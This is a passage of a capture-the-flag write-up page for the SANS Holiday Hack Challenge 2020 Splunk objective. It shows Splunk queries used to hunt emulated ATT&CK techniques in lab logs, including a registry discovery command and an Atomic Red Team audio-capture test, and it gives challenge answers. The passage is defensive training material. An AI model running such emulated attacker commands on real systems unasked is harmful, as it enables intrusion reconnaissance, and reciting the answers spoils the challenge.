@@ -1,0 +1,1002 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <meta name="author" content="Joe Ammond (pugpug)">
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.3">
+    
+    
+      
+        <title>Splunk Challenge - SANS HHC 2020 writeup</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.3b61ea93.min.css">
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="../../css/print.css">
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#splunk-challenge" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="SANS HHC 2020 writeup" class="md-header-nav__button md-logo" aria-label="SANS HHC 2020 writeup">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SANS HHC 2020 writeup
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              Splunk Challenge
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="SANS HHC 2020 writeup" class="md-nav__button md-logo" aria-label="SANS HHC 2020 writeup">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    SANS HHC 2020 writeup
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="http://ammond.org" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Welcome
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      Objectives
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Objectives" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        Objectives
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../1/" class="md-nav__link">
+      Uncover Santa's Gift List
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../2/" class="md-nav__link">
+      Investigate S3 Bucket
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../3/" class="md-nav__link">
+      Point-of-Sale Password Recovery
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../4/" class="md-nav__link">
+      Operate the Santavator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../5/" class="md-nav__link">
+      Open HID Lock
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Splunk Challenge
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      Splunk Challenge
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    Objective
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#angel-candysalts-dialog" class="md-nav__link">
+    Angel Candysalt's dialog:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints" class="md-nav__link">
+    Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#question-1-how-many-distinct-mitre-attck-techniques-did-alice-emulate" class="md-nav__link">
+    Question 1: How many distinct MITRE ATT&amp;CK techniques did Alice emulate?
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2-what-are-the-names-of-the-two-indexes-that-contain-the-results-of-emulating-enterprise-attck-technique-1059003-put-them-in-alphabetical-order-and-separate-them-with-a-space" class="md-nav__link">
+    Question 2: What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-3-one-technique-that-santa-had-us-simulate-deals-with-system-information-discovery-what-is-the-full-name-of-the-registry-key-that-is-queried-to-determine-the-machineguid" class="md-nav__link">
+    Question 3: One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-4-according-to-events-recorded-by-the-splunk-attack-range-when-was-the-first-ostap-related-atomic-test-executed-please-provide-the-alphanumeric-utc-timestamp" class="md-nav__link">
+    Question 4: According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-5-one-atomic-red-team-test-executed-by-the-attack-range-makes-use-of-an-open-source-package-authored-by-frgnca-on-github-according-to-sysmon-event-code-1-events-in-splunk-what-was-the-processid-associated-with-the-first-use-of-this-component" class="md-nav__link">
+    Question 5: One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-6-alice-ran-a-simulation-of-an-attacker-abusing-windows-registry-run-keys-this-technique-leveraged-a-multi-line-batch-file-that-was-also-used-by-a-few-other-techniques-what-is-the-final-command-of-this-multi-line-batch-file-used-as-part-of-this-simulation" class="md-nav__link">
+    Question 6: Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-7-according-to-x509-certificate-events-captured-by-zeek-formerly-bro-what-is-the-serial-number-of-the-tls-certificate-assigned-to-the-windows-domain-controller-in-the-attack-range" class="md-nav__link">
+    Question 7: According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../7/" class="md-nav__link">
+      Solve the Sleigh's CAN-D-BUS Problem
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../8/" class="md-nav__link">
+      Broken Tag Generator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../9/" class="md-nav__link">
+      ARP Shenanigans
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../10/" class="md-nav__link">
+      Defeat Fingerprint Sensor
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../11a/" class="md-nav__link">
+      Naughty/Nice List with Blockchain Investigation Part 1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../11b/" class="md-nav__link">
+      Naughty/Nice List with Blockchain Investigation Part 2
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+    
+    <label class="md-nav__link" for="nav-4">
+      Fun stuff
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Fun stuff" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        Fun stuff
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fun/portrait/" class="md-nav__link">
+      Santa's portrait poem
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fun/secret-garden/" class="md-nav__link">
+      The Secret Garden
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fun/nail/" class="md-nav__link">
+      The Nail
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../conclusion/" class="md-nav__link">
+      Conclusion
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    Objective
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#angel-candysalts-dialog" class="md-nav__link">
+    Angel Candysalt's dialog:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints" class="md-nav__link">
+    Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#question-1-how-many-distinct-mitre-attck-techniques-did-alice-emulate" class="md-nav__link">
+    Question 1: How many distinct MITRE ATT&amp;CK techniques did Alice emulate?
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2-what-are-the-names-of-the-two-indexes-that-contain-the-results-of-emulating-enterprise-attck-technique-1059003-put-them-in-alphabetical-order-and-separate-them-with-a-space" class="md-nav__link">
+    Question 2: What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-3-one-technique-that-santa-had-us-simulate-deals-with-system-information-discovery-what-is-the-full-name-of-the-registry-key-that-is-queried-to-determine-the-machineguid" class="md-nav__link">
+    Question 3: One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-4-according-to-events-recorded-by-the-splunk-attack-range-when-was-the-first-ostap-related-atomic-test-executed-please-provide-the-alphanumeric-utc-timestamp" class="md-nav__link">
+    Question 4: According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-5-one-atomic-red-team-test-executed-by-the-attack-range-makes-use-of-an-open-source-package-authored-by-frgnca-on-github-according-to-sysmon-event-code-1-events-in-splunk-what-was-the-processid-associated-with-the-first-use-of-this-component" class="md-nav__link">
+    Question 5: One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-6-alice-ran-a-simulation-of-an-attacker-abusing-windows-registry-run-keys-this-technique-leveraged-a-multi-line-batch-file-that-was-also-used-by-a-few-other-techniques-what-is-the-final-command-of-this-multi-line-batch-file-used-as-part-of-this-simulation" class="md-nav__link">
+    Question 6: Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-7-according-to-x509-certificate-events-captured-by-zeek-formerly-bro-what-is-the-serial-number-of-the-tls-certificate-assigned-to-the-windows-domain-controller-in-the-attack-range" class="md-nav__link">
+    Question 7: According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset"><a class="md-content__button md-icon" download href="6.pdf" title="PDF Export"><svg style="height: 1.2rem; width: 1.2rem;" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M224 136V0H24C10.7 0 0 10.7 0 24v464c0 13.3 10.7 24 24 24h336c13.3 0 24-10.7 24-24V160H248c-13.2 0-24-10.8-24-24zm76.45 211.36l-96.42 95.7c-6.65 6.61-17.39 6.61-24.04 0l-96.42-95.7C73.42 337.29 80.54 320 94.82 320H160v-80c0-8.84 7.16-16 16-16h32c8.84 0 16 7.16 16 16v80h65.18c14.28 0 21.4 17.29 11.27 27.36zM377 105L279.1 7c-4.5-4.5-10.6-7-17-7H256v128h128v-6.1c0-6.3-2.5-12.4-7-16.9z"></path></svg></a>
+              
+                
+                
+                <h1 id="splunk-challenge">Splunk Challenge<a class="headerlink" href="#splunk-challenge" title="Permanent link">#</a></h1>
+<p>Moving around the dark room behind the locked door, we see what look like peep holes in the wall. Walking to them, we discover we've been transformed into (or are controlling) Santa. Just what is going on here?</p>
+<p><img alt="Dark room and peep holes" src="../../img/6/o6-1.png" /></p>
+<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">#</a></h2>
+<blockquote>
+<p>Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?<br></p>
+</blockquote>
+<p><code>Difficulty: 3/5</code></p>
+<h2 id="angel-candysalts-dialog">Angel Candysalt's dialog:<a class="headerlink" href="#angel-candysalts-dialog" title="Permanent link">#</a></h2>
+<blockquote>
+<p>Hey Santa, there’s some crazy stuff going on that we can see through our Splunk infrastructure.<br>
+You better login and see what’s up.<br></p>
+</blockquote>
+<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">#</a></h2>
+<blockquote>
+<p>There was a great <a href="https://www.youtube.com/watch?v=qbIhHhRKQCw">Splunk talk</a> at KringleCon 2 that's still available!<br>
+Dave Herrald talks about emulating advanced adversaries and <a href="https://www.youtube.com/watch?v=RxVgEFt08kU">hunting them with Splunk</a>.<br>
+Defenders often need to manipulate data to decRypt, deCode, and refourm it into something that is useful. <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> is extremely useful here!<br></p>
+</blockquote>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">#</a></h2>
+<p>In this objective, we're going to be using Splunk to find events and data
+related to a simulated attack against Santa's infrastructure. Some knowledge of Splunk or similar SIEM/logging platforms is useful for this task, but the videos in the Hints will give a good foundation to help with completing this objective.</p>
+<p><img alt="Objective questions" src="../../img/6/o6-2.png" /></p>
+<p>The KringleCastle
+SOC (Security Operations Center) has used a testing tool known as <a href="https://github.com/redcanaryco/atomic-red-team">Atomic
+Red Team</a> to perform a set
+of tactics and techniques that attackers use to penetrate systems. The MITRE
+corporation has developed a knowledge base of these tactics/techniques known as
+<a href="https://attack.mitre.org/">ATT&amp;CK</a>. Logging into the Splunk terminal as Santa, we
+see there's a chat room for the SOC analysts:</p>
+<p><img alt="SOC Chatroom" src="../../img/6/o6-3.png" /></p>
+<p>And a private chat between Alice Bluebird (the KringleCastle SOC Team Lead) and Santa:</p>
+<p><img alt="Alice/Santa chat" src="../../img/6/o6-4.png" /></p>
+<p>We have a series of questions to answer before we can get to the final question for the objective:</p>
+<p><img alt="Splunk challenge questions" src="../../img/6/o6-5.png" /></p>
+<p>It's helpful to open an additional browser tab with the Splunk interface to run queries against, leaving the KringleCon SOC chat window open for access to the questions.</p>
+<h3 id="question-1-how-many-distinct-mitre-attck-techniques-did-alice-emulate">Question 1: <code>How many distinct MITRE ATT&amp;CK techniques did Alice emulate?</code><a class="headerlink" href="#question-1-how-many-distinct-mitre-attck-techniques-did-alice-emulate" title="Permanent link">#</a></h3>
+<p>To answer this, Alice gives us the basic part of the question: <code>| tstats count where index=* by index</code>, which yields these results:</p>
+<p><img alt="Question 1 Splunk results" src="../../img/6/o6-6.png" /></p>
+<p>The 'Techniques' in the simulation are organized into individual Splunk indexes, named
+after the technique (ex. <code>t0133</code>, <code>t0157</code>, ...). A technique can have sub-techniques, such
+as <code>t1059.003</code> and <code>t1059.005</code>. The question calls for the number of top-level techniques,
+which counted up add to <code>13</code>.</p>
+<p>Answering the question gives us more dialog from Alice in the chat, including a Splunk query that returns the exact answer:</p>
+<div class="highlight"><pre><span></span><code>| tstats count where index=* by index
+| search index=T*-win OR T*-main
+| rex field=index &quot;(?&lt;technique&gt;t\d+)[\.\-].0*&quot;
+| stats dc(technique)
+</code></pre></div>
+<h3 id="question-2-what-are-the-names-of-the-two-indexes-that-contain-the-results-of-emulating-enterprise-attck-technique-1059003-put-them-in-alphabetical-order-and-separate-them-with-a-space">Question 2: <code>What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)</code><a class="headerlink" href="#question-2-what-are-the-names-of-the-two-indexes-that-contain-the-results-of-emulating-enterprise-attck-technique-1059003-put-them-in-alphabetical-order-and-separate-them-with-a-space" title="Permanent link">#</a></h3>
+<p>Using the screenshot above, we can see the two indexes is <code>t1059.003-main t1059.003-win</code>.</p>
+<h3 id="question-3-one-technique-that-santa-had-us-simulate-deals-with-system-information-discovery-what-is-the-full-name-of-the-registry-key-that-is-queried-to-determine-the-machineguid">Question 3: <code>One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?</code><a class="headerlink" href="#question-3-one-technique-that-santa-had-us-simulate-deals-with-system-information-discovery-what-is-the-full-name-of-the-registry-key-that-is-queried-to-determine-the-machineguid" title="Permanent link">#</a></h3>
+<p>For this question, we'l need to dig into the MITRE ATT&amp;CK framework to determine
+which technique is being used, and therefore which Splunk index to search. MITRE
+has developed a tool to facilitate searching the framework for techniques, available
+<a href="https://mitre-attack.github.io/attack-navigator/">here</a>. Open that page in a new tab,
+click 'Create a new layer', and select 'Enterprise'. This brings up a browsable and
+searchable instance of ATT&amp;CK. We can search for 'system information discovery' and get a link to the page related to that technique:</p>
+<p><img alt="Searching MITRE ATT&amp;CK" src="../../img/6/o6-7.png" /></p>
+<p>Clicking on the 'view' link takes us to the specific page on the technique, which is T1082:</p>
+<p><img alt="T1082 ATT&amp;CK technique" src="../../img/6/o6-8.png" /></p>
+<p>Using that technique number as the index, we can then search Splunk for the keyword <code>MachineGuid</code>, to find where the simulated attack queried the regstry:</p>
+<p><img alt="Splunk query index=t1082-win MachineGuid" src="../../img/6/o6-9.png" /></p>
+<p>The command line used to query the registry was <code>REG  QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid</code>, which makes the key queried <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</code>.</p>
+<h3 id="question-4-according-to-events-recorded-by-the-splunk-attack-range-when-was-the-first-ostap-related-atomic-test-executed-please-provide-the-alphanumeric-utc-timestamp">Question 4: <code>According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)</code><a class="headerlink" href="#question-4-according-to-events-recorded-by-the-splunk-attack-range-when-was-the-first-ostap-related-atomic-test-executed-please-provide-the-alphanumeric-utc-timestamp" title="Permanent link">#</a></h3>
+<p><a href="https://malpedia.caad.fkie.fraunhofer.de/details/js.ostap">OSTap</a> is a JavaScript-based
+downloader commonly used to deliver malware such as TrickBot. </p>
+<p>Alice gives a hint on what index to search:</p>
+<blockquote>
+<p>I suppose the SOC elves might overthink this one. Splunk Attack Range keeps track of the simulations that are run in<br>
+<code>index=attack</code><br>
+You can then search that index for specific keywords...<br></p>
+</blockquote>
+<p>We can search Splunk for
+anything related OSTap it with <code>index=attack ostap</code>. We're looking for the UTC timestamp of
+the earliest technique, so scrolling down to the bottom of the ressults and expanding #8 gives us a timestamp of <code>2020-11-30T17:44:15Z</code></p>
+<p><img alt="OSTap timestamp" src="../../img/6/o6-10.png" /></p>
+<h3 id="question-5-one-atomic-red-team-test-executed-by-the-attack-range-makes-use-of-an-open-source-package-authored-by-frgnca-on-github-according-to-sysmon-event-code-1-events-in-splunk-what-was-the-processid-associated-with-the-first-use-of-this-component">Question 5: <code>One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?</code><a class="headerlink" href="#question-5-one-atomic-red-team-test-executed-by-the-attack-range-makes-use-of-an-open-source-package-authored-by-frgnca-on-github-according-to-sysmon-event-code-1-events-in-splunk-what-was-the-processid-associated-with-the-first-use-of-this-component" title="Permanent link">#</a></h3>
+<p>This question requires a bit more research. We need to look at <a href="https://github.com/frgnca">frngca's GitHub page</a> to find what package the tool is using, so we can search Splunk for when it was used. Looking at their repositories, one jumps out: <code>AudioDeviceCmdlets</code>, used to control audio devices on Windows:</p>
+<p><img alt="frgnca's GitHub repos" src="../../img/6/o6-11.png" /></p>
+<p>So we're looking for something to do with audio devices. Going back to the ATT&amp;CK navigator and searching for 'audio', we find <code>Audio capture</code> is technique <code>T1123</code>.</p>
+<p><img alt="ATT&amp;CK Navigator search for 'audio'" src="../../img/6/o6-12.png" /></p>
+<p>We can then go to the Atomic Red Team <a href="https://github.com/redcanaryco/atomic-red-team/">GitHub Repository</a> to look at the specific tests run for <code>T1123</code> in the file <code>https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.yaml</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">attack_technique</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">T1123</span>
+<span class="nt">display_name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Audio Capture</span>
+<span class="nt">atomic_tests</span><span class="p">:</span>
+<span class="p p-Indicator">-</span> <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">using device audio capture commandlet</span>
+  <span class="nt">auto_generated_guid</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">9c3ad250-b185-4444-b5a9-d69218a10c95</span>
+  <span class="nt">description</span><span class="p">:</span> <span class="p p-Indicator">|</span>
+    <span class="no">[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)</span>
+  <span class="nt">supported_platforms</span><span class="p">:</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">windows</span>
+  <span class="nt">executor</span><span class="p">:</span>
+    <span class="nt">command</span><span class="p">:</span> <span class="p p-Indicator">|</span>
+      <span class="no">powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet</span>
+    <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">powershell</span>
+</code></pre></div>
+<p>Searching Splunk for <code>index=t1123-win WindowsAudioDevice-Powershell-Cmdlet</code> and scrolling to the bottom of the results yields this data:</p>
+<p><img alt="Splunk results for WindowsAudioDevice-Powershell-Cmdlet" src="../../img/6/o6-13.png" /></p>
+<p>The <code>ProcessId</code> is <code>0xe40</code>, which when converted from hexadecimal to base 10 is <code>3648</code>.</p>
